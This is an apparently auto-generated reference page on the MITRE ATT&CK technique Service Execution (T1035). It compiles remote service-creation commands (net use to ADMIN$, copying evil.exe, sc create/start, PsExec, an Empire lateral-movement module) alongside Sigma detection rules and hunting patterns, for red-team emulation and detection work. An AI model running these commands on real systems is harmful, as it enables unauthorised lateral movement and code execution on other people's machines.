
# Service Execution

## Description

### MITRE Description

> Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or privilege escalation.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: True
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1035

## Potential Commands

```
Creating a new service remotely:
net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
copy evil.exe \\COMP\ADMIN$\System32\acachsrv.exe
sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto  DisplayName= "DisplayName"
sc \\COMP start acachsrv
Creating a new service remotely:
shell net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
shell sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"
shell sc \\COMP start acachsrv
sc.exe create ARTService binPath= #{executable_command}
sc.exe start ARTService
sc.exe delete ARTService

sc.exe create #{service_name} binPath= %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt
sc.exe start #{service_name}
sc.exe delete #{service_name}

C:\PSTools\PsExec.exe \\#{remote_host} "C:\Windows\System32\calc.exe"

#{psexec_exe} \\localhost "C:\Windows\System32\calc.exe"

!=wininit
services.exe
*.exe
pcalua.exe
\\Windows\\.+\\sc.exestart|create|query|config
\SYSTEM\CurrentControlSet\services
\SYSTEM\CurrentControlSet\services\\Windows\\.+\\lsass.exe|\\Windows\\.+\\svchost.exe
powershell/lateral_movement/invoke_psexec
powershell/lateral_movement/invoke_psexec
```

## Commands Dataset

```
[{'command': 'Creating a new service remotely:\n'
             'net use \\\\COMP\\ADMIN$ "password" /user:DOMAIN_NAME\\UserName\n'
             'copy evil.exe \\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
             'sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto  DisplayName= '
             '"DisplayName"\n'
             'sc \\\\COMP start acachsrv',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Creating a new service remotely:\n'
             'shell net use \\\\COMP\\ADMIN$ "password" '
             '/user:DOMAIN_NAME\\UserName\n'
             'shell copy evil.exe \\\\COMP\\ADMIN$\\acachsrv.exe\n'
             'shell sc \\\\COMP create acachsrv binPath= '
             '"C:\\Windows\\System32\\acachsrv.exe" start= auto description= '
             '"Description here" DisplayName= "DisplayName"\n'
             'shell sc \\\\COMP start acachsrv',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'sc.exe create ARTService binPath= #{executable_command}\n'
             'sc.exe start ARTService\n'
             'sc.exe delete ARTService\n',
  'name': None,
  'source': 'atomics/T1035/T1035.yaml'},
 {'command': 'sc.exe create #{service_name} binPath= %COMSPEC% /c '
             'powershell.exe -nop -w hidden -command New-Item -ItemType File '
             'C:\\art-marker.txt\n'
             'sc.exe start #{service_name}\n'
             'sc.exe delete #{service_name}\n',
  'name': None,
  'source': 'atomics/T1035/T1035.yaml'},
 {'command': 'C:\\PSTools\\PsExec.exe \\\\#{remote_host} '
             '"C:\\Windows\\System32\\calc.exe"\n',
  'name': None,
  'source': 'atomics/T1035/T1035.yaml'},
 {'command': '#{psexec_exe} \\\\localhost "C:\\Windows\\System32\\calc.exe"\n',
  'name': None,
  'source': 'atomics/T1035/T1035.yaml'},
 {'command': '!=wininit',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'services.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '*.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'pcalua.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '\\\\Windows\\\\.+\\\\sc.exestart|create|query|config',
  'name': None,
  'source': 'SysmonHunter - Service Execution'},
 {'command': '\\SYSTEM\\CurrentControlSet\\services',
  'name': None,
  'source': 'SysmonHunter - Service Execution'},
 {'command': '\\SYSTEM\\CurrentControlSet\\services\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe',
  'name': None,
  'source': 'SysmonHunter - Service Execution'},
 {'command': 'powershell/lateral_movement/invoke_psexec',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_psexec',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Omer Faruk Celik',
                  'date': '2018/03/20',
                  'description': 'Detects the use of smbexec.py tool by '
                                 'detecting a specific service installation',
                  'detection': {'condition': 'service_installation',
                                'service_installation': {'EventID': 7045,
                                                         'ServiceFileName': '*\\execute.bat',
                                                         'ServiceName': 'BTOBTO'}},
                  'falsepositives': ['Penetration Test', 'Unknown'],
                  'fields': ['ServiceName', 'ServiceFileName'],
                  'id': '52a85084-6989-40c3-8f32-091e12e13f09',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'system'},
                  'references': ['https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/'],
                  'tags': ['attack.lateral_movement',
                           'attack.execution',
                           'attack.t1077',
                           'attack.t1035'],
                  'title': 'smbexec.py Service Installation'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/03/13',
                  'description': 'Detects a PsExec service start',
                  'detection': {'condition': 'selection',
                                'selection': {'ProcessCommandLine': 'C:\\Windows\\PSEXESVC.exe'}},
                  'falsepositives': ['Administrative activity'],
                  'id': '3ede524d-21cc-472d-a3ce-d21b568d8db7',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2012/12/11',
                  'tags': ['attack.execution', 'attack.t1035', 'attack.s0029'],
                  'title': 'PsExec Service Start'}},
 {'data_source': {'author': 'Timur Zinniatullin, Daniil Yugoslavskiy, '
                            'oscd.community',
                  'date': '2019/10/21',
                  'description': 'Detects manual service execution (start) via '
                                 'system utilities',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine|contains': ' start ',
                                              'Image|endswith': ['\\net.exe',
                                                                 '\\net1.exe']}},
                  'falsepositives': ['Legitimate administrator or user '
                                     'executes a service for legitimate '
                                     'reason'],
                  'id': '2a072a96-a086-49fa-bcb5-15cc5a619093',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1035/T1035.yaml'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1035'],
                  'title': 'Service Execution'}},
 {'data_source': {'action': 'global',
                  'author': 'Thomas Patzke',
                  'description': 'Detects PsExec service installation and '
                                 'execution events (service and Sysmon)',
                  'detection': {'condition': '1 of them'},
                  'falsepositives': ['unknown'],
                  'fields': ['EventID',
                             'CommandLine',
                             'ParentCommandLine',
                             'ServiceName',
                             'ServiceFileName'],
                  'id': '42c575ea-e41e-41f1-b248-8093c3e82a28',
                  'level': 'low',
                  'references': ['https://www.jpcert.or.jp/english/pub/sr/ir_research.html',
                                 'https://jpcertcc.github.io/ToolAnalysisResultSheet'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1035', 'attack.s0029'],
                  'title': 'PsExec Tool Execution'}},
 {'data_source': {'detection': {'service_execution': {'EventID': 7036,
                                                      'ServiceName': 'PSEXESVC'},
                                'service_installation': {'EventID': 7045,
                                                         'ServiceFileName': '*\\PSEXESVC.exe',
                                                         'ServiceName': 'PSEXESVC'}},
                  'logsource': {'product': 'windows', 'service': 'system'}}},
 {'data_source': {'detection': {'sysmon_processcreation': {'Image': '*\\PSEXESVC.exe',
                                                           'User': 'NT '
                                                                   'AUTHORITY\\SYSTEM'}},
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'}}}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Creating '
                                                                              'a '
                                                                              'new '
                                                                              'service '
                                                                              'remotely:\n'
                                                                              'net '
                                                                              'use '
                                                                              '\\\\COMP\\ADMIN$ '
                                                                              '"password" '
                                                                              '/user:DOMAIN_NAME\\UserName\n'
                                                                              'copy '
                                                                              'evil.exe '
                                                                              '\\\\COMP\\ADMIN$\\System32\\acachsrv.exe\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'create '
                                                                              'acachsrv '
                                                                              'binPath= '
                                                                              '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                              'start= '
                                                                              'auto  '
                                                                              'DisplayName= '
                                                                              '"DisplayName"\n'
                                                                              'sc '
                                                                              '\\\\COMP '
                                                                              'start '
                                                                              'acachsrv',
                                                  'Category': 'T1035',
                                                  'Cobalt Strike': 'Creating a '
                                                                   'new '
                                                                   'service '
                                                                   'remotely:\n'
                                                                   'shell net '
                                                                   'use '
                                                                   '\\\\COMP\\ADMIN$ '
                                                                   '"password" '
                                                                   '/user:DOMAIN_NAME\\UserName\n'
                                                                   'shell copy '
                                                                   'evil.exe '
                                                                   '\\\\COMP\\ADMIN$\\acachsrv.exe\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'create '
                                                                   'acachsrv '
                                                                   'binPath= '
                                                                   '"C:\\Windows\\System32\\acachsrv.exe" '
                                                                   'start= '
                                                                   'auto '
                                                                   'description= '
                                                                   '"Description '
                                                                   'here" '
                                                                   'DisplayName= '
                                                                   '"DisplayName"\n'
                                                                   'shell sc '
                                                                   '\\\\COMP '
                                                                   'start '
                                                                   'acachsrv',
                                                  'Description': 'This '
                                                                 'technique '
                                                                 'creates a '
                                                                 'new service '
                                                                 'on the '
                                                                 'remote '
                                                                 'machine. '
                                                                 "It's "
                                                                 'important to '
                                                                 'note the '
                                                                 'spaces after '
                                                                 'the = in '
                                                                 'these '
                                                                 'commands! '
                                                                 'Also, before '
                                                                 'starting the '
                                                                 'service, run '
                                                                 'the '
                                                                 'following '
                                                                 'commands to '
                                                                 'make sure '
                                                                 'everything '
                                                                 'is set up '
                                                                 'properly:\n'
                                                                 'sc \\\\COMP '
                                                                 'qc acachsrv\n'
                                                                 'dir '
                                                                 '\\\\COMP\\ADMIN$\\acachsrv.exe',
                                                  'Metasploit': ''}},
 {'Atomic Red Team Test - Service Execution': {'atomic_tests': [{'description': 'Creates '
                                                                                'a '
                                                                                'service '
                                                                                'specifying '
                                                                                'an '
                                                                                'aribrary '
                                                                                'command '
                                                                                'and '
                                                                                'executes '
                                                                                'it. '
                                                                                'When '
                                                                                'executing '
                                                                                'commands '
                                                                                'such '
                                                                                'as '
                                                                                'PowerShell, '
                                                                                'the '
                                                                                'service '
                                                                                'will '
                                                                                'report '
                                                                                'that '
                                                                                'it '
                                                                                'did '
                                                                                'not '
                                                                                'start '
                                                                                'correctly '
                                                                                'even '
                                                                                'when '
                                                                                'code '
                                                                                'executes '
                                                                                'properly.\n'
                                                                                '\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'cmd.exe '
                                                                                'create '
                                                                                'a '
                                                                                'new '
                                                                                'service '
                                                                                'using '
                                                                                'sc.exe '
                                                                                'create '
                                                                                'that '
                                                                                'will '
                                                                                'start '
                                                                                'powershell.exe '
                                                                                'to '
                                                                                'create '
                                                                                'a '
                                                                                'new '
                                                                                'file '
                                                                                '`art-marker.txt`\n',
                                                                 'executor': {'command': 'sc.exe '
                                                                                         'create '
                                                                                         '#{service_name} '
                                                                                         'binPath= '
                                                                                         '#{executable_command}\n'
                                                                                         'sc.exe '
                                                                                         'start '
                                                                                         '#{service_name}\n'
                                                                                         'sc.exe '
                                                                                         'delete '
                                                                                         '#{service_name}\n',
                                                                              'elevation_required': True,
                                                                              'name': 'command_prompt'},
                                                                 'input_arguments': {'executable_command': {'default': '%COMSPEC% '
                                                                                                                       '/c '
                                                                                                                       'powershell.exe '
                                                                                                                       '-nop '
                                                                                                                       '-w '
                                                                                                                       'hidden '
                                                                                                                       '-command '
                                                                                                                       'New-Item '
                                                                                                                       '-ItemType '
                                                                                                                       'File '
                                                                                                                       'C:\\art-marker.txt',
                                                                                                            'description': 'Command '
                                                                                                                           'to '
                                                                                                                           'execute '
                                                                                                                           'as '
                                                                                                                           'a '
                                                                                                                           'service',
                                                                                                            'type': 'string'},
                                                                                     'service_name': {'default': 'ARTService',
                                                                                                      'description': 'Name '
                                                                                                                     'of '
                                                                                                                     'service '
                                                                                                                     'to '
                                                                                                                     'create',
                                                                                                      'type': 'string'}},
                                                                 'name': 'Execute '
                                                                         'a '
                                                                         'Command '
                                                                         'as a '
                                                                         'Service',
                                                                 'supported_platforms': ['windows']},
                                                                {'dependencies': [{'description': 'PsExec '
                                                                                                  'tool '
                                                                                                  'from '
                                                                                                  'Sysinternals '
                                                                                                  'must '
                                                                                                  'exist '
                                                                                                  'on '
                                                                                                  'disk '
                                                                                                  'at '
                                                                                                  'specified '
                                                                                                  'location '
                                                                                                  '(#{psexec_exe})\n',
                                                                                   'get_prereq_command': 'Invoke-WebRequest '
                                                                                                         '"https://download.sysinternals.com/files/PSTools.zip" '
                                                                                                         '-OutFile '
                                                                                                         '"$env:TEMP\\PsTools.zip"\n'
                                                                                                         'Expand-Archive '
                                                                                                         '$env:TEMP\\PsTools.zip '
                                                                                                         '$env:TEMP\\PsTools '
                                                                                                         '-Force\n'
                                                                                                         'New-Item '
                                                                                                         '-ItemType '
                                                                                                         'Directory '
                                                                                                         '("#{psexec_exe}") '
                                                                                                         '-Force '
                                                                                                         '| '
                                                                                                         'Out-Null\n'
                                                                                                         'Copy-Item '
                                                                                                         '$env:TEMP\\PsTools\\PsExec.exe '
                                                                                                         '"#{psexec_exe}" '
                                                                                                         '-Force\n',
                                                                                   'prereq_command': 'if '
                                                                                                     '(Test-Path '
                                                                                                     '"#{psexec_exe}") '
                                                                                                     '{ '
                                                                                                     'exit '
                                                                                                     '0} '
                                                                                                     'else '
                                                                                                     '{ '
                                                                                                     'exit '
                                                                                                     '1}\n'}],
                                                                 'description': 'Requires '
                                                                                'having '
                                                                                'Sysinternals '
                                                                                'installed, '
                                                                                'path '
                                                                                'to '
                                                                                'sysinternals '
                                                                                'is '
                                                                                'one '
                                                                                'of '
                                                                                'the '
                                                                                'input '
                                                                                'input_arguments\n'
                                                                                'Will '
                                                                                'run '
                                                                                'a '
                                                                                'command '
                                                                                'on '
                                                                                'a '
                                                                                'remote '
                                                                                'host.\n'
                                                                                '\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'powershell '
                                                                                'will '
                                                                                'download '
                                                                                'psexec.exe '
                                                                                'and '
                                                                                'spawn '
                                                                                'calc.exe '
                                                                                'on '
                                                                                'a '
                                                                                'remote '
                                                                                'endpoint '
                                                                                '(default:localhost).\n',
                                                                 'executor': {'command': '#{psexec_exe} '
                                                                                         '\\\\#{remote_host} '
                                                                                         '"C:\\Windows\\System32\\calc.exe"\n',
                                                                              'elevation_required': False,
                                                                              'name': 'powershell'},
                                                                 'input_arguments': {'psexec_exe': {'default': 'C:\\PSTools\\PsExec.exe',
                                                                                                    'description': 'Path '
                                                                                                                   'to '
                                                                                                                   'PsExec',
                                                                                                    'type': 'string'},
                                                                                     'remote_host': {'default': 'localhost',
                                                                                                     'description': 'Remote '
                                                                                                                    'hostname '
                                                                                                                    'or '
                                                                                                                    'IP '
                                                                                                                    'address',
                                                                                                     'type': 'string'}},
                                                                 'name': 'Use '
                                                                         'PsExec '
                                                                         'to '
                                                                         'execute '
                                                                         'a '
                                                                         'command '
                                                                         'on a '
                                                                         'remote '
                                                                         'host',
                                                                 'supported_platforms': ['windows']}],
                                               'attack_technique': 'T1035',
                                               'display_name': 'Service '
                                                               'Execution'}},
 {'Threat Hunting Tables': {'chain_id': '100076',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1035',
                            'mitre_caption': 'service_execution',
                            'os': 'windows',
                            'parent_process': '!=wininit',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'services.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100124',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Sobnot.A',
                            'loaded_dll': '',
                            'mitre_attack': 'T1035',
                            'mitre_caption': 'service_execution',
                            'os': 'windows',
                            'parent_process': '*.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'pcalua.exe',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1035': {'description': None,
                           'level': 'medium',
                           'name': 'Service Execution',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'start|create|query|config'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\sc.exe'}},
                                      'type': 'process'},
                                     {'process': {'cmdline': {'pattern': '\\SYSTEM\\CurrentControlSet\\services'}},
                                      'type': 'process'},
                                     {'op': 'and',
                                      'process': {'image': {'flag': 'regex',
                                                            'op': 'not',
                                                            'pattern': '\\\\Windows\\\\.+\\\\lsass.exe|\\\\Windows\\\\.+\\\\svchost.exe'}},
                                      'reg': {'path': {'pattern': '\\SYSTEM\\CurrentControlSet\\services'}},
                                      'type': 'reg'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1035',
                                            'ATT&CK Technique #2': 'T1077',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_psexec":  '
                                                                                 '["T1035","T1077"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_psexec',
                                            'Technique': 'Service '
                                                         'Execution\xa0'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations

None

# Actors


* [Honeybee](../actors/Honeybee.md)

* [Ke3chang](../actors/Ke3chang.md)
    
* [APT32](../actors/APT32.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Silence](../actors/Silence.md)
    
